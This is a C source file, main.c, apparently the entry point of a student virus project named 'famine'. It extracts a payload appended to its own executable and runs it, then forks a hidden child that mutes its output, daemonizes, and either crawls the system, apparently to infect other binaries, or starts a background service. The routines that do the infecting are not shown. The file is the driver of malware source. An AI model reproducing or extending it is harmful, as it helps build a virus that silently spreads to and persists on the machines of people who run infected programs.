/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mbatty <mbatty@student.42angouleme.fr>     +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/02/20 12:30:09 by mbatty            #+#    #+#             */
/*   Updated: 2026/05/23 14:17:49 by mbatty           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "famine.h"
#include "service.h"

#include <unistd.h>

void	sha256(uint8_t *msg, uint64_t len, uint8_t buf[32]);

int	main(__attribute__((unused)) int ac, char **av, char **envp)
{
	t_exec_ctx	exec_ctx = {0};

	exec_ctx.av = av;
	exec_ctx.envp = envp;
	readlink("/proc/self/exe", exec_ctx.exec_path, sizeof(exec_ctx.exec_path));

	int	pid = fork();
	if (pid == -1)
		return (0);
	else if (pid != 0)
	{
		uint8_t		*buf;
		uint64_t	size;

		if (extract_payload(exec_ctx.exec_path, &buf, &size) == 0)
			exec_payload(&exec_ctx, buf, size);
		return (0);
	}

	if (mute_outputs() == -1)
		return (0);

	int	whoami = daemonize();
	if (whoami == I_AM_A_MISTAKE)
		return (0);
	else if (whoami == I_AM_MAIN_PROCESS)
		return (crawl(&exec_ctx), 0);
	else if (whoami == I_AM_CHILD_PROCESS)
		return (run_service(), 0);
	return (0);
}
